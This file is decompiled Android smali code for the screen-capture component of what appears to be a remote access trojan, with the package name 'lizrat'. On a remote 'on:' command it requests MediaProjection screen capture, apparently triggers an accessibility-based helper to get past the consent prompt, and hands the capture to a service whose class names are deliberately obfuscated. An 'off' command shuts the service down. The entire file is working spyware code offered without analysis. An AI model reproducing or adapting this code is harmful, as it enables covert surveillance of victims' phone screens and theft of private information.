.class public LLiz0rd/lizrat/SCRActivity;
.super Landroid/app/Activity;
.source "SCRActivity.java"


# static fields
.field private static final REQUEST_SCREENSHOT:I = 0xe93a

.field private static staticIntentData:Landroid/content/Intent;

.field private static staticResultCode:I


# instance fields
.field private F:I

.field private Perantid:Ljava/lang/String;

.field private Qualti:I

.field private mgr:Landroid/media/projection/MediaProjectionManager;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 14
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0xa

    .line 19
    iput v0, p0, LLiz0rd/lizrat/SCRActivity;->Qualti:I

    .line 20
    iput v0, p0, LLiz0rd/lizrat/SCRActivity;->F:I

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    .line 25
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 26
    invoke-super {p0}, Landroid/app/Activity;->finishAndRemoveTask()V

    goto :goto_0

    .line 28
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    :goto_0
    return-void
.end method

.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const v0, 0xe93a

    if-ne p1, v0, :cond_0

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    const/4 p1, 0x0

    .line 133
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32FOR_SC:Ljava/lang/Boolean;

    .line 134
    sput-object p3, LLiz0rd/lizrat/SCRActivity;->staticIntentData:Landroid/content/Intent;

    .line 135
    sput p2, LLiz0rd/lizrat/SCRActivity;->staticResultCode:I

    .line 136
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "resultCode"

    .line 138
    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "resultIntent"

    .line 139
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object p1

    iget p2, p0, LLiz0rd/lizrat/SCRActivity;->Qualti:I

    const-string p3, "Q"

    .line 140
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    iget-object p2, p0, LLiz0rd/lizrat/SCRActivity;->Perantid:Ljava/lang/String;

    const-string p3, "P"

    .line 141
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    iget p2, p0, LLiz0rd/lizrat/SCRActivity;->F:I

    const-string p3, "F"

    .line 142
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    .line 144
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/SCRActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 148
    :cond_0
    invoke-virtual {p0}, LLiz0rd/lizrat/SCRActivity;->finish()V

    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 11

    const-string v0, "on:"

    .line 40
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 62
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    .line 41
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/SCRActivity;->requestWindowFeature(I)Z

    .line 42
    invoke-virtual {p0}, LLiz0rd/lizrat/SCRActivity;->getWindow()Landroid/view/Window;

    move-result-object v2

    const/16 v3, 0x400

    invoke-virtual {v2, v3, v3}, Landroid/view/Window;->setFlags(II)V

    .line 47
    :try_start_0
    invoke-virtual {p0}, LLiz0rd/lizrat/SCRActivity;->getIntent()Landroid/content/Intent;

    move-result-object v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2

    const/4 v3, 0x0

    :try_start_1
    const-string v4, "key"

    .line 50
    invoke-virtual {v2, v4}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    nop

    :goto_0
    if-nez v3, :cond_0

    :try_start_2
    const-string v3, "off"

    .line 58
    :cond_0
    invoke-virtual {v3, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 61
    sget-object v2, LLiz0rd/lizrat/SCRActivity;->staticIntentData:Landroid/content/Intent;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    const v4, 0xe93a

    const-string v5, "media_projection"

    const-string v6, "~"

    const-string v7, ""

    const/4 v8, 0x0

    if-nez v2, :cond_1

    .line 62
    :try_start_3
    sput-object v1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32FOR_SC:Ljava/lang/Boolean;

    .line 63
    invoke-virtual {v3, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 64
    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 65
    aget-object v1, v0, v8

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    iput v1, p0, LLiz0rd/lizrat/SCRActivity;->Qualti:I

    .line 66
    aget-object p1, v0, p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    iput p1, p0, LLiz0rd/lizrat/SCRActivity;->F:I

    const/4 p1, 0x2

    .line 67
    aget-object p1, v0, p1

    iput-object p1, p0, LLiz0rd/lizrat/SCRActivity;->Perantid:Ljava/lang/String;

    .line 69
    invoke-virtual {p0, v5}, LLiz0rd/lizrat/SCRActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, LLiz0rd/lizrat/SCRActivity;->mgr:Landroid/media/projection/MediaProjectionManager;

    .line 71
    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1, v4}, LLiz0rd/lizrat/SCRActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 74
    sget-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->MyAccess:LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;

    invoke-virtual {p1}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32Treger()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_2

    goto/16 :goto_2

    .line 79
    :cond_1
    :try_start_4
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    sput-object v2, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32FOR_SC:Ljava/lang/Boolean;

    .line 80
    invoke-virtual {v3, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v3

    .line 81
    invoke-virtual {v3, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 82
    aget-object v9, v2, v8

    invoke-static {v9}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v9

    iput v9, p0, LLiz0rd/lizrat/SCRActivity;->Qualti:I

    .line 83
    aget-object v2, v2, p1

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    iput v2, p0, LLiz0rd/lizrat/SCRActivity;->F:I

    .line 84
    new-instance v2, Landroid/content/Intent;

    const-class v9, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-direct {v2, p0, v9}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v9, "resultCode"

    sget v10, LLiz0rd/lizrat/SCRActivity;->staticResultCode:I

    .line 86
    invoke-virtual {v2, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v2

    const-string v9, "resultIntent"

    sget-object v10, LLiz0rd/lizrat/SCRActivity;->staticIntentData:Landroid/content/Intent;

    .line 87
    invoke-virtual {v2, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v2

    const-string v9, "Q"

    iget v10, p0, LLiz0rd/lizrat/SCRActivity;->Qualti:I

    .line 88
    invoke-virtual {v2, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v2

    const-string v9, "P"

    iget-object v10, p0, LLiz0rd/lizrat/SCRActivity;->Perantid:Ljava/lang/String;

    .line 89
    invoke-virtual {v2, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v2

    const-string v9, "F"

    iget v10, p0, LLiz0rd/lizrat/SCRActivity;->F:I

    .line 90
    invoke-virtual {v2, v9, v10}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v2

    .line 92
    invoke-virtual {p0, v2}, LLiz0rd/lizrat/SCRActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_1

    .line 94
    :catch_1
    :try_start_5
    sput-object v1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32FOR_SC:Ljava/lang/Boolean;

    .line 95
    invoke-virtual {v3, v0, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 96
    invoke-virtual {v0, v6}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 97
    aget-object v1, v0, v8

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    iput v1, p0, LLiz0rd/lizrat/SCRActivity;->Qualti:I

    .line 98
    aget-object p1, v0, p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    iput p1, p0, LLiz0rd/lizrat/SCRActivity;->F:I

    .line 100
    invoke-virtual {p0, v5}, LLiz0rd/lizrat/SCRActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, LLiz0rd/lizrat/SCRActivity;->mgr:Landroid/media/projection/MediaProjectionManager;

    .line 102
    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1, v4}, LLiz0rd/lizrat/SCRActivity;->startActivityForResult(Landroid/content/Intent;I)V

    .line 105
    sget-object p1, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew31;->MyAccess:LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;

    invoke-virtual {p1}, LLiz0rd/lizrat/membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32;->membershipveuropevnoseifeaturedwchiefltahoevtitansasacrificeaendlcombinevkeptbelementaryapreferencew32Treger()V

    .line 108
    :goto_1
    invoke-virtual {p0}, LLiz0rd/lizrat/SCRActivity;->finish()V

    goto :goto_2

    .line 113
    :cond_2
    new-instance p1, Landroid/content/Intent;

    const-class v0, LLiz0rd/lizrat/weddingcmetalliccpositionjsimpsonsnpointeddparentalqlionsgairskypesaluminumaevaluatedntrendq22;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "com.appser.verapp.SHUTDOWN"

    .line 115
    invoke-virtual {p1, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    .line 118
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/SCRActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 119
    invoke-virtual {p0}, LLiz0rd/lizrat/SCRActivity;->finish()V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto :goto_2

    .line 122
    :catch_2
    invoke-virtual {p0}, LLiz0rd/lizrat/SCRActivity;->finish()V

    :goto_2
    return-void
.end method

.method protected onDestroy()V
    .locals 0

    .line 34
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method
